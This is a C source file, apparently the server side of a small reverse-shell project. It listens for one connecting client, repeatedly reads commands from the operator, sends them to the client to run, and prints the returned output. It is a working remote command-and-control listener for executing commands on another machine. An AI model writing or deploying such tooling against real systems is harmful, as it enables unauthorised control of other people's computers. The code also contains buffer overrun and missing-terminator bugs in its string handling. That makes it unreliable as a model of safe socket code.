#include "server.h"
#include "reverse-shell.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <signal.h>

// The only way i could figure out how to quit the program
// was by using signals. When looking up the documentation
// i could not find a way to pass arguments to the signal handler.
// Thats why i store these as global variables.
int server_side_socket;
int server_side_client_socket;
bool server_is_running = false;

// Define functions for the server:
client_command create_command(char* command_str);
bool send_command_to_client(int client_socket, char *terminal_command);
bool read_string(char *str, int maxLength);
void tear_down_server(int signal_nr);

// Starts a server at the given host and port.
// When the client is connected the user is prompt to enter
// commands that should execute on the client and 
// send a response back to the server.
void create_server_socket(const char *host, int port) {
    printf("Creating server at: %s:%d\r\n", host, port);
    signal(SIGINT, tear_down_server);

    server_side_socket = socket(AF_INET, SOCK_STREAM, 0);

    if(server_side_socket < 0) {
        perror("Error opening server socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in socket_addr = {0};
    socket_addr.sin_family = AF_INET;
    socket_addr.sin_port = htons(port);
    socket_addr.sin_addr.s_addr = inet_addr(host);

    // Bind the server socket to the address.
    if(bind(server_side_socket, (struct sockaddr *) 
        &socket_addr, sizeof(socket_addr)) < 0) {
        perror("Error binding");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming, but only one client 
    // connection allowed.
    if(listen(server_side_socket, 1) < 0) {
        perror("Fail to listen");
        exit(EXIT_FAILURE);
    }

    server_is_running = true;

    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    if((server_side_client_socket = accept(server_side_socket, (struct sockaddr *) &client_addr, &client_addr_len)) < 0) {
        perror("Error accepting client");
        exit(EXIT_FAILURE);
    }
    
    char *terminal_cmd = malloc(sizeof(char) * MAX_COMMAND_LENGTH);
    bool still_exec = true;

    do{
        printf("Enter command to execute on the client: ");
        still_exec = read_string(terminal_cmd, MAX_COMMAND_LENGTH);

        if(send_command_to_client(server_side_client_socket, terminal_cmd)) {
            printf("Successfully sent command: < %s > to client.\r\n", terminal_cmd);
            int response_size;

            recv(server_side_client_socket, &response_size, sizeof(int), 0);

            if(response_size > 0) {
                printf("The message recieved has size: %d\r\n", response_size);
                char* response = malloc(response_size);
                recv(server_side_client_socket, response, response_size, 0);
                printf("Response:\r\n%s\r\n", response);
                free(response);
            }
        }
    } while(still_exec && server_is_running);

    free(terminal_cmd);
}

// When CTRL + C is pressed the server 
// should tear down by closing the client_socket, and then
// close the server_side_socket.
void tear_down_server(int signal_nr) {
    if(server_is_running) {
        signal(SIGINT, tear_down_server);
        printf("Tearing down server..\r\n");

        if(server_side_client_socket != 0 && close(server_side_client_socket) < 0) {
            perror("Error closing client connection");
        }

        if(server_side_socket != 0 && close(server_side_socket) < 0) {
            perror("Error closing server");
            exit(EXIT_FAILURE);
        }

        server_is_running = false;
        printf("Server successfully teared down..\r\n");
        exit(EXIT_SUCCESS);
    }
}

// Creation of client_command struct.
client_command create_command(char* command_str) {
    client_command cmd;
    cmd.header.command_length = strlen(command_str);
    strncpy(cmd.command_string, command_str, cmd.header.command_length);
    return cmd;
}

// Send a command to the client.
// Client should recieve this and execute the terminal_command.
bool send_command_to_client(int client_socket, char *terminal_command) {
    if(terminal_command == NULL || strlen(terminal_command) == 0)
        return false; // No need to send an empty command

    client_command cmd = create_command(terminal_command);
    send(client_socket, &cmd.header, sizeof(cmd.header), 0);
    send(client_socket, cmd.command_string, cmd.header.command_length, 0);

    return true;
}

// Reads user input inside bounderies of max_length.
bool read_string(char *str, int max_length) {
    int current, counter = 0;

    while(counter < max_length && (current = getchar()) != '\n') {
        if(current == EOF)
            return false;

        str[counter] = current;
        counter++;
    }

    str[counter] = '\0';
    return true;
}
